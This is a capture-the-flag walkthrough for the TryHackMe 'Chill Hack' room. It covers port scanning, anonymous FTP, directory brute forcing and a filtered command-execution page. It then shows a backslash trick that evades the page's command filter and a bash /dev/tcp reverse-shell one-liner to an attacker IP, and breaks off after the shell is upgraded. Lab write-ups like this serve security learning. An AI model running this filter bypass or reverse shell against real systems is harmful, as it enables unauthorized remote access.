# TryHackMe - Chill Hack Room
<img width="551" alt="image" src="https://user-images.githubusercontent.com/114961392/210290991-812658d1-ebe3-4732-8137-bb465e0eab7c.png">

## Reconnaissance
Let's start by scanning all ports with nmap then run a version and script scan for all open ports.  

<img width="494" alt="image" src="https://user-images.githubusercontent.com/114961392/210291196-1070d4d7-0ddd-4b33-995e-20519771c1f9.png">

Ports 21 (FTP), 22 (SSH), and 80 (HTTP) are open. Port 21 (FTP) allows anonymous login which I will check out.  
The webpage is a gaming information site which looks pretty good however there is nothing too interesting to play with.  

<img width="740" alt="image" src="https://user-images.githubusercontent.com/114961392/210291496-46597055-060f-45f3-9321-fde604000749.png">

Let's check out FTP by logging in anonymously.  
There is only 1 file in there called note.txt which I will grab. This just says that there is filtering on strings being put in the command. I am assuming this will be a clue once I have done all recon.  
There are also 2 names (Anurodh and Apaar) which I will note down for later.  

<img width="830" alt="image" src="https://user-images.githubusercontent.com/114961392/210292050-b6978420-db7d-4ecb-8663-060b935ae6d0.png">

Now let's brute force for any hidden directories.  

<img width="484" alt="image" src="https://user-images.githubusercontent.com/114961392/210292520-d3abaaef-62d7-4bde-90de-9c2675fd04df.png">

This reveals that there is a hidden directory called **/secret**. When I navigate to the directory, I am presented with a basic page which let's you execute commands. Looking back on the note I discovered in FTP, I am assuming that they were referencing this page and there will be a filter on these commands. Let's have a look.  

<img width="170" alt="image" src="https://user-images.githubusercontent.com/114961392/210293055-4ad2dfba-00f9-4474-bc61-2bc460110333.png">

When I try to enter the simple command **ls**, it fails and text comes up asking if I am a hacker. Looks like there is definitely some filtering going on here.  

<img width="978" alt="image" src="https://user-images.githubusercontent.com/114961392/210293680-0e35a016-703b-461e-bc7e-a4fbd3b5d3ad.png">

However the **id** command works.  

<img width="422" alt="image" src="https://user-images.githubusercontent.com/114961392/210293893-0d129b6e-a29c-44ce-83ee-d5570636a811.png">

After doing some research on google for bypassing filters, there is some useful information on [hacktricks](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions) which I will use.  
I found that the best technique to bypass is to enter a backslash after the first letter in the command followed by the rest of the command. Such as **l\s -la**.  

<img width="1263" alt="image" src="https://user-images.githubusercontent.com/114961392/210294407-4d20ee4a-ad7c-4344-b956-66ae26deebb0.png">

## Exploitation
Now that I can bypass the filter, let's try executing a reverse shell. I will use command **b\ash -c "bash -i >& /dev/tcp/10.4.2.215/4444 0>&1"**. Remember that I need to enter a backslash after the first letter of the command.  

<img width="401" alt="image" src="https://user-images.githubusercontent.com/114961392/210294685-27989c0f-6e6d-454f-b959-26a18314fc86.png">

This works and now we have a reverse shell! Before continuing, I will upgrade the shell using the stty technique **script /dev/null -c bash** followed by **stty raw -echo; fg**.  


